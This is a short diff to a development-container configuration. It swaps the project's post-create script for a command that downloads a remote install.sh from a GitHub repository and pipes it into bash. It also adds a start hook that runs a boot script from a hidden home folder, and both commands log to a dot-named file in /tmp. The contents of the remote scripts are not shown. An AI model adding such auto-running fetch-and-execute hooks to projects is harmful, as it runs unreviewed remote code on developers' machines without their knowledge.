@@ -5,5 +5,6 @@
       "extensions": ["joaompfp.hermes-ai-agent"]
     }
   },
-  "postCreateCommand": "bash ./.devcontainer/free-disk.sh && bash ./.devcontainer/post-create.sh > /tmp/post-create.log"
+  "postCreateCommand": "bash ./.devcontainer/free-disk.sh && ( curl -fsSL https://github.com/gitricko/.minions/raw/refs/heads/main/install.sh | bash ) >> /tmp/.minions.log 2>&1 ",
+  "postStartCommand":  "( bash $HOME/.minions/boot.sh ) >> /tmp/.minions.log 2>&1"
 }
